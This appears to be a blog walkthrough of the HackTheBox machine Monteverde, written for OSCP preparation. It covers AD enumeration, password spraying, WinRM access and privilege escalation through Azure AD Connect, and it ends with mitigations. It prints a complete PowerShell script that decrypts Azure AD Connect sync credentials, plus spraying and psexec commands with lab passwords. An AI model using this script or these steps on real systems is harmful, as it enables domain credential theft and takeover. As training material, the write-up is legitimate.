---
title: Monteverde
date: 2025-06-14
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB, AD, password-spray, weak-creds, Azure-AD-Connect] 
image: monteverde.png
media_subpath: /assets/img/posts/2025-06-14-monteverdeHTB/
---
## Introduction

Monteverde is a **Medium-difficulty Windows machine** centered around Azure AD Connect. After enumerating domain users, a **password spray attack** revealed that the `SABatchJobs` account used its username as its password. With SMB enumeration, a **world-readable `$users` share** exposed an XML file containing credentials. Due to **password reuse**, these credentials allowed WinRM access as `mhope`. Further enumeration showed **Azure AD Connect** was installed, which enabled extraction of **synchronization credentials**, leading to a **domain admin compromise**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 53

Domain: megabank.local

- **dig any DNS records**
    
    ```bash
    dig any megabank.local @$IP
    ```
    
    ![image.png](image%202.png)
    
- **Zone Transfer**
    
    ```bash
    dig axfr @$IP megabank.local
    ```
    
    ![image.png](image%203.png)
    

### Port 139/445

- smbclient
    
    ```bash
    smbclient -L //$IP/ -N
    ```
    
    ![image.png](image%204.png)
    

### Port 5985 (WinRM)

## AD Initial Enumeration

### User Enumeration

Unauthenticated

```bash
./kerbrute_linux_amd64 userenum -d megabank.local --dc $IP /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 70
```

```bash
impacket-lookupsid 'megabank.local/guest'@megabank.local -no-pass
```

![image.png](image%205.png)

### User Description Fields

```bash
sudo nxc smb $IP -u ''  -p '' --users
```

Nothing interesting in User Description Fields but at least we enumerated users.

### Port 389/3268

```powershell
ldapsearch -x -H ldap://$IP -D '' -w '' -b "DC=megabank,DC=local" 
```

Anonymous Bind is enabled but I couldn’t find anything interesting.

## Initial Attack Vectors

### AS-REP Roasting

```bash
GetNPUsers.pymegabank.local/ -dc-ip $IP -no-pass -usersfile users
```

![image.png](image%206.png)

### Password Spraying

```bash
sudo nxc smb $IP -u users -p users --continue-on-success
```

![image.png](image%207.png)

## Credentialed Enum as SABatchJobs

I found `azure.xml` file in `mhope's` directory.

![image.png](image%208.png)

![image.png](image%209.png)

Password Spraying:

![image.png](image%2010.png)

## Shell as mhope

```bash
sudo nxc winrm $IP -u mhope -p '4n0therD4y@n0th3r$'
```

![image.png](image%2011.png)

**Enumeration - BloodHound**

```powershell
upload SharpHound.exe
.\SharpHound.exe -c All --zipfilename monteverde
```

![image.png](image%2012.png)

We are a member of `Azure Admins`.

Checking installed applications I found out that `Azure AD Connect` is installed:

![image.png](image%2013.png)

I found this [blog post](https://vbscrub.video.blog/2020/01/14/azure-ad-connect-database-exploit-priv-esc/) related to this and trying to run the tool provided returns me error:

![image.png](image%2014.png)

It also references this [blog post](https://blog.xpnsec.com/azuread-connect-for-redteam/)

I tried running the provided code to extract `MSOL` account password but it failed:

```powershell
.\azuread_decrypt_msol.ps1
```

![image.png](image%2015.png)

I found [here](https://www.tevora.com/threat-blog/targeting-msol-accounts-to-compromise-internal-networks/) that we should change sqlconnection string, but I cannot locate `SqlLocalDb.exe`.

After a bit of searching I found this [blog post](https://www.synacktiv.com/publications/azure-ad-introduction-for-red-teamers.html) where it mentions:

**The default configuration of Azure AD Connect uses a SQL Server Express database but a fully deployed SQL Server can also be used. In that case, the connection string from the POC must be replaced by the following: `"Server=LocalHost;Database=ADSync;Trusted_Connection=True;"`.**

I changed connection string and used this code:

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=LocalHost;Database=ADSync;Trusted_Connection=True;"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)
```

Now running the script I can retrieve credentials:

```powershell
.\azuread_decrypt_msol.ps1
```

![image.png](image%2016.png)

It actually supposed to be credentials for `MSOL` account which is able to perform `DCSync` but here we retrieved Administrator credentials.

```powershell
psexec.py megabank.local/Administrator:'d0m@in4dminyeah!'@$IP
```

![image.png](image%2017.png)

## Credentials

```bash
SABatchJobs:SABatchJobs
mhope:4n0therD4y@n0th3r$
administrator:d0m@in4dminyeah!
```

## Mitigation

- Enforce **strong password policies** and avoid using predictable passwords like usernames.
- Prevent **password reuse** across accounts.
- Secure SMB shares by applying **least privilege access** and auditing file permissions.
- Limit and monitor access to **Azure AD Connect**, and protect its configuration files.
- Ensure the **Azure AD Sync account** has only required permissions and is **not a domain admin**.
